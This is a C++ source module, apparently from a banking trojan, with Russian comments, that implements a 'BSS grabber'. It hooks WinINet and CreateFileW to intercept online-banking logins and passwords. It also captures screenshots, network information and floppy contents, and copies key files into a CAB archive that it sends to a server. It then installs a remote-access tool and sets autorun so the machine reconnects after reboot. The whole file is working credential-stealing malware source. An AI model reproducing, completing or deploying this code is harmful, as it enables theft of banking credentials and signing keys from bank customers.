
#include "Modules.h"

#ifdef BSSH
//===========================================================================================

#include "Loader.h"
#include "Utils.h"
#include "StrConsts.h"
#include "ScreenShots.h"
#include "BotClasses.h"

//bss

#include "BotDebug.h"

namespace BSSBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define BSSDBG BSSBGTEMPLATES::DBGOutMessage<>



typedef struct
{
	HCAB hCab; 
	char *Path;
	bool Form;
	DWORD dwEntry;
	bool bFloppy;
} TBSSLog, *PBSSLog;


typedef HANDLE ( WINAPI *BSSFUNC_CreateFileW	   )( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
typedef BOOL   ( WINAPI *BSSFUNC_InternetWriteFile )( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten );

BSSFUNC_InternetWriteFile REAL_BSSInternetWriteFile;
BSSFUNC_CreateFileW	      REAL_BSSCreateFileW;

bool     BSSHooksInitialized = false;
DWORD    BSSGrabberPID = 0;
PBSSLog  BSSLog = NULL;
PList    HashListBBS = NULL;
bool     HookBSSCreateFileWOnce = false;


//-----------------------------------------------------------------------------
void ClearBSSLog()
{
	// Очищаем структуру лога
	if (BSSLog)
	{
		pDeleteFileA(BSSLog->Path);
		STR::Free(BSSLog->Path);
		FreeStruct(BSSLog);
		BSSLog = NULL;
	}
}
//-----------------------------------------------------------------------------



bool InitializeBSS()
{
	// Инициализируем BSS грабер

	if (IsNewProcess(BSSGrabberPID))
	{
		BSSLog = NULL;
		HashListBBS = NULL;
		BSSHooksInitialized = false;
	}

    ClearBSSLog();

	BSSLog = CreateStruct(TBSSLog);

	// Создаём CAB архив
	bool Initialized = false;
	if (BSSLog)
	{		
		BSSLog->Path = File::GetTempNameA();
		BSSLog->hCab = CreateCab(BSSLog->Path);
		Initialized  = BSSLog->hCab != NULL;
	}
	return Initialized;
}
//-----------------------------------------------------------------------------


bool IsBSSFileFormat( WCHAR *lpFileName )
{

	DWORD dwBssFormats[] = { 0x18F2F2, 0x1AF2F9, 0x1CF2E3,
							 0x1C3AE2, 0x18F96C, 0x1BF871,
							 0x193133, 0x1C32ED, 0x1CB2F1, 0 };

	DWORD Hash = GetFileFormat( lpFileName );

	for ( DWORD i = 0; dwBssFormats[i] != 0; i++ )
	{
		if (Hash == dwBssFormats[i])
			return true;
	}

	return false;	
}


void AddHashBBS(DWORD Hash)
{
	List::Add(HashListBBS, (LPVOID)Hash);
}

bool FindHashBBS(DWORD Hash)
{
	return List::IndexOf(HashListBBS, (LPVOID)Hash) >= 0;
}
//----------------------------------------------------------------------------

HANDLE WINAPI HOOK_BSSCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	HANDLE hRet = REAL_BSSCreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );

	if (!BSSLog) return hRet;

    // Проверяем формат файла
	if (IsBSSFileFormat( (WCHAR*)lpFileName ) && BSSLog->Form )
	{
		WCHAR FileName[ MAX_PATH ];
		plstrcpyW( FileName, lpFileName );

		DWORD dwFileHash = CalcHashW( (WCHAR*)FileName );

		if ( !FindHashBBS( dwFileHash ) )
		{			
			pCloseHandle( hRet );
			HANDLE hFile = REAL_BSSCreateFileW( FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	
			if ( hFile != INVALID_HANDLE_VALUE )
			{		
				DWORD h;
				DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );		

				LPBYTE lpFile = NULL;

				if ( dwFileSize > 0 )
				{
					HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, 0, 0 );

					if ( hMapFile != INVALID_HANDLE_VALUE )
					{
						LPBYTE pbyFile = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

						if ( pbyFile != NULL )
						{
							WCHAR *TempPath = GetTempName();

							if ( TempPath )
							{
								HANDLE hTmp = REAL_BSSCreateFileW( TempPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
							
								if ( hTmp != (HANDLE)-1 )
								{
									DWORD dwWritten = 0;
									pWriteFile( hTmp, pbyFile, dwFileSize, &dwWritten, 0 );
								}

								pCloseHandle( hTmp );
								AddHashBBS( dwFileHash );
								PCHAR TempPathStr = WSTR::ToAnsi(TempPath, 0);
								PCHAR FileNameStr = WSTR::ToAnsi(FileName, 0);

								if ( AddFileToCab( BSSLog->hCab, TempPathStr, FileNameStr ) )
								{
									BSSLog->dwEntry++;
								}
								STR::Free(TempPathStr);
								STR::Free(FileNameStr);

								pDeleteFileW( TempPath );
							}

							MemFree( TempPath );
						}

						pUnmapViewOfFile( pbyFile );
					}

					pCloseHandle( hMapFile );
				}
			}

			pCloseHandle( hFile );

			hRet = REAL_BSSCreateFileW( FileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
		}
	}

	return hRet; 
}
//----------------------------------------------------------------------------

void HookBSSCreateFileW()
{
	if (!BSSHooksInitialized)
	{
		BSSDBG("BSS", "Инициализируем хуки создания файлов");
		const DWORD HASH_CreateFileW = 0x8F8F102;
		if ( HookApi( DLL_KERNEL32, HASH_CreateFileW, &HOOK_BSSCreateFileW ) )
		{
			__asm mov [REAL_BSSCreateFileW], eax

			BSSHooksInitialized = true;
		}
    }
}



void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite )
{

	if ( lpBuffer != NULL && dwNumberOfBytesToWrite )
	{
		DWORD dwUrlSize = 1024;

		char *Url = (char*)MemAlloc( dwUrlSize + 1 );

		if ( Url )
		{
			if ( pInternetQueryOptionA( hFile, INTERNET_OPTION_URL, Url, &dwUrlSize ) )
			{
				if ( CompareUrl( "*bsi.dll*", Url ) )
				{
					//char *Buffer = (char*)MemAlloc( 1024 );

					PCHAR Tmp = (PCHAR)lpBuffer;
					PCHAR Login		= GetTextBetween(Tmp,  "<L>", "</L>" );
					PCHAR Password	= GetTextBetween(Tmp,  "<P>", "</P>" );
					if ( Login != NULL && Password != NULL)
					{
						BSSDBG("BSS", "Перехвачен запрос");

						HINTERNET hParent;
						DWORD dwSize = sizeof( HINTERNET );

						char UserAgent[256];

						pInternetQueryOptionA( hFile, INTERNET_OPTION_PARENT_HANDLE, &hParent, &dwSize );
						pInternetQueryOptionA( hParent, INTERNET_OPTION_PARENT_HANDLE, &hParent, &dwSize );

						dwSize = sizeof( UserAgent ) - 1;

						if ( !pInternetQueryOptionA( hParent, INTERNET_OPTION_USER_AGENT, UserAgent, &dwSize ) )
						{
							UserAgent[0] = '-';
							UserAgent[1] = '\0';
						}


                        // Создаём лог
						string Log;
						Log.Format(GetStr(BSSLogTemplate).t_str(), Url, Login, Password, UserAgent);

						// Записываем данные в файл

						if (InitializeBSS())
						{
							// Добавляем лог
							AddStringToCab(BSSLog->hCab, Log, GetStr(StrLogFileTextData));
							BSSLog->Form = true;

							// Добавляем скриншот
							PCHAR ScreenFile = File::GetTempNameA();

							if (ScreenShot::CaptureScreenA(ScreenFile))
								AddFileToCab( BSSLog->hCab, ScreenFile, GetStr(StrLogFileScreenShot));

							STR::Free(ScreenFile);


							// Добавляем информацию о конфигурации сети
							PCHAR NetFile = GetNetInfo();

							if (NetFile)
							{
								AddFileToCab( BSSLog->hCab, NetFile, GetStr(StrLogFileNetInfo));
								pDeleteFileA( NetFile );
							}
							STR::Free(NetFile);

							// Добавляем содержимое флопика
							pSetErrorMode( SEM_FAILCRITICALERRORS );
							if (AddDirToCab( BSSLog->hCab, "A:", "Floppy" ))
								BSSLog->bFloppy = true;


							// Ставим хуки на доступ к файлам, для перехвата
							// ключей
                            HookBSSCreateFileW();
							#ifdef AmmyyH
								Ammyy::Install(false);
							#endif 
							VideoProcess::SetAutorun(true); //после ребута сконектиться с сервером
							VideoProcess::ConnectToServer(0);
						}
					}

					STR::Free( Login );
					STR::Free( Password );
				}
			}
		}
	}

	if ( BSSLog != NULL  && BSSLog->dwEntry )
	{
		//UnhookCreateFileW();
        BSSDBG("BSS", "Отправляем лог BSS грабера");
		if ( !BSSLog->bFloppy )
		{
			pSetErrorMode( SEM_FAILCRITICALERRORS ); 
			AddDirToCab( BSSLog->hCab, "A:", "Floppy" );
		}

		CloseCab(BSSLog->hCab);

		DataGrabber::SendCabDelayed(NULL, BSSLog->Path, "BSS");
		ClearBSSLog();
	}
}


BOOL WINAPI HOOK_BSSInternetWriteFile( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten )
{
	GetBSSInfo( hFile, lpBuffer, dwNumberOfBytesToWrite );
	return REAL_BSSInternetWriteFile( hFile, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten );
}



DWORD BSSPID = 0;




void BSSHooks()
{

	if (IsNewProcess(BSSPID))
	{
		BSSHooksInitialized = false;
		BSSLog = NULL;

		HashListBBS = List::Create();
		const DWORD HASH_InternetWriteFile = 0x205BD56A;
		if ( HookApi( DLL_WININET, HASH_InternetWriteFile, &HOOK_BSSInternetWriteFile ) )
		{
			__asm mov [REAL_BSSInternetWriteFile], eax
		}

		BSSDBG("BSS", "BSS грабер инициализирован");
	}
}

//===========================================================================================
#endif